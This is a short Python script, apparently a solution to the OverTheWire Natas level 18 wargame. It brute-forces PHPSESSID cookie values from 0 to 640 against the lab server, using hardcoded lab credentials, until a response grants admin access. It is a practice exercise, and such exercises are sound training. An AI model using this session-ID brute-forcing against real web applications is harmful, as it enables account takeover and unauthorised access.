import requests
import time

url = 'http://natas18.natas.labs.overthewire.org'
user = 'natas18'
password = '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ'

s = requests.Session()

for i in range(0, 641):
    s.cookies.set('PHPSESSID', str(i)) 
    response = s.get(url, auth=(user, password))
    if ("You are an admin" in response.text):
        print(f'Deu certo: {i}')
        print(response.text)
    #print(f'Estou no {i}')
    
